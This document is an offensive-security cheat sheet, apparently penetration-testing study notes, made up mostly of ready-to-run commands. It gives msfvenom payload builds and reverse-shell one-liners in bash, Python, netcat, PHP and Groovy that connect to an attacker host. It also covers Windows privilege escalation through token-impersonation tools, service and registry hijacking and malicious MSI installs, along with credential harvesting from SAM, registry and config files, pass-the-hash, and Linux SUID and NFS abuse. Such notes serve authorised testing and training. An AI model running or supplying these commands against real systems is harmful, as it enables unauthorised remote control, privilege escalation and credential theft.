# Exploiting

### Exploitation

#### Reverse Shells

#### Msfvenom

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell-x64.exe
msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war > shell.war
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php
```

#### One Liners

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

```python
python -c 'import socket,os,pty;s=socket.socket([socket.AF](<http://socket.AF>)_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

```bash
nc -e /bin/sh 10.0.0.1 4242
```

```bash
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done
```

```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.11.0.106/443 0>&1'");?>
```

**#For powershell use the encrypted tool that's in Tools folder**

ðŸ’¡ While dealing with PHP reverse shell use: [https://github.com/ivan-sincek/php-reverse-](https://github.com/ivan-sincek/php-reverse-)

#### Groovy reverse-shell

For Jenkins

```groovy
String host="[localhost](<http://localhost>)";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write([pi.read](<http://pi.read>)());while(pe.available()>0)so.write([pe.read](<http://pe.read>)());while(si.available()>0)po.write([si.read](<http://si.read>)());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Windows Privilege Escalation

#### Basic

```powershell
#Starting, Restarting and Stopping services in Powershell
Start-Service SERVICE_NAME
Stop-Service SERVICE_NAME
Restart-Service SERVICE_NAME

#Powershell History
type C:\\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
```

#### Automated Scripts

```
winpeas.exe
winpeas.bat
[Jaws-enum.ps](<http://Jaws-enum.ps>)1
[powerup.ps](<http://powerup.ps>)1
[PrivescCheck.ps](<http://PrivescCheck.ps>)1
```

#### Token Impersonation

* Command to check

```bash
whoami /priv
```

```bash
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -c "nc.exe ATTACKER_IP PORT -e cmd"

#RoguePotato
RoguePotato.exe -r ATTACKER_IP -e "shell.exe" -l 9999

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

#SharpEfsPotato
SharpEfsPotato.exe -p C:\\temp\\nc.exe -a "ATTACKER_IP PORT -e cmd" > w.log  #writes whoami command to w.log file
```

#### Services

#### Binary Hijacking

```bash
#Identify service from winpeas
icalcs "path"  #F means full permission, we need to check we have full access on folder
sc qc SERVICE_NAME  #find binarypath variable
sc config SERVICE_NAME binpath= "C:\\temp\\reverse.exe"  #change the path to the reverseshell location
sc start SERVICE_NAME
```

#### Unquoted Service Path

```bash
wmic service get name,pathname | findstr /i /v "C:\\\\" | findstr /i /v """  #Display services with unquoted paths
#Check the Writable path
icalcs "path"
#Insert the payload in writable location and which works.
sc start SERVICE_NAME
```

#### Insecure Service Executables

In Winpeas look for a service which has the following

```
File Permissions: Everyone [AllAccess]
```

Replace the executable in the service folder and start the service

```bash
sc start SERVICE_NAME
```

#### Weak Registry permissions

Look for the following in Winpeas services info output

```
HKLM\\<service> (Interactive [FullControl])  #This means we can edit the registry value
```

```bash
accesschk /acceptula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\SERVICE  #Check for KEY_ALL_ACCESS
#Service Information from regedit, identify the variable which holds the executable
reg query HKLM\\SYSTEM\\CurrentControlSet\\services\\SERVICE
reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\SERVICE /v ImagePath /t REG_EXPAND_SZ /d C:\\temp\\reverse.exe /f  #Imagepath is the variable here
net start SERVICE
```

#### DLL Hijacking

_Reference for DLL Hijacking techniques_

#### Autorun

```bash
#For checking, it will display some information with file-location
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
#Check the location is writable
accesschk.exe -wvu "C:\\PATH\\TO\\FILE"  #returns FILE_ALL_ACCESS
#Replace the executable with the reverseshell and we need to wait till Admin logins, then we get shell
```

#### AlwaysInstallElevated

```bash
#For checking, it should return 1 or 0x1
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

#Creating a reverseshell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT --platform windows -f msi -o reverse.msi

#Execute and get shell
msiexec /quiet /qn /i reverse.msi
```

#### Schedules Tasks

```bash
schtasks /query /fo LIST /v  #Displays list of scheduled tasks, Pickup any interesting one
#Permission check - Writable means exploitable!
icalcs "path"
#Wait till the scheduled task in executed, then we'll get a shell
```

#### Startup Apps

```
C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp
```

Startup applications can be found in above locations

Check writable permissions and transfer reverse shell there

The only catch here is the system needs to be restarted

#### Insecure GUI apps

Check the applications that are running from "TaskManager" and obtain list of applications running with high integrity

Open that particular application, using "open" feature enter the following

```
[file://c:/windows/system32/cmd.exe](file://c:/windows/system32/cmd.exe)
```

#### Passwords

#### Sensitive files

```bash
%SYSTEMROOT%\\repair\\system
%SYSTEMROOT%\\repair\\SAM
%SYSTEMROOT%\\repair\\SAM
%SYSTEMROOT%\\System32\\config\\RegBack\\SAM
%SYSTEMROOT%\\System32\\config\\SAM
%SYSTEMROOT%\\repair\\system

findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
Findstr /si password *.config
findstr /si pass/pwd *.ini

dir /s *pass* == *cred* == *vnc* == *.config*
```

in all files

```bash
findstr /spin "password" *.*
findstr /spin "password" *.*
```

#### Config files

```
c:\\sysprep.inf
c:\\sysprep\\sysprep.xml
%WINDIR%\\Panther\\Unattend\\Unattended.xml
%WINDIR%\\Panther\\Unattended.xml
```

```bash
dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*

dir c:\\*vnc.ini /s /b
dir c:\\*ultravnc.ini /s /b
dir c: /s /b | findstr /si *vnc.ini
```

#### Registry

```bash
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"

### VNC
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query "HKCU\\Software\\TightVNC\\Server"

### Windows autologin
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

### SNMP Parameters
reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"

### Putty
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"

### Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### RunAs - Savedcreds

```bash
cmdkey /list  #Displays stored credentials, looks for any potential users
#Transfer the reverseshell
runas /savecred /user:admin C:\\temp\\reverse.exe
```

#### Pass the Hash

If hashes are obtained through some means then use psexec, smbexec and obtain the shell as Administrator

```bash
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe //TARGET_IP cmd
```

### Linux Privilege Escalation

#### TTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

#### Basic

```bash
find / -writable -type d 2>/dev/null
dpkg -l  #Installed applications on debian system
cat /etc/fstab  #Listing mounted drives
lsblk  #Listing all available drives
lsmod  #Listing loaded drivers
```

#### Automated Scripts

```
[linPEAS.sh](<http://linPEAS.sh>)
[LinEnum.sh](<http://LinEnum.sh>)
[linuxprivchecker.py](<http://linuxprivchecker.py>)
unix-privesc-check
Metasploit: multi/recon/local_exploit_suggester
```

#### Sensitive Information

```bash
cat .bashrc
env  #checking environment variables
watch -n 1 "ps -aux | grep pass"  #Harvesting active processes for credentials
#Process related information can also be obtained from PSPY
```

#### Sudo/SUID/Capabilities

ðŸ’¡ GTFOBins: [https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

#### Cron Jobs

```bash
#Detecting Cronjobs
cat /etc/crontab
crontab -l
pspy  #handy tool to livemonitor stuff happening in Linux
```

#### NFS

```bash
##Mountable shares
cat /etc/exports  #On target
showmount -e TARGET_IP  #On attacker
###Check for "no_root_squash" in the output of shares
mount -o rw TARGET_IP:SHARE_PATH LOCAL_MOUNT_POINT  #Now create a binary there
chmod +x BINARY_NAME
```
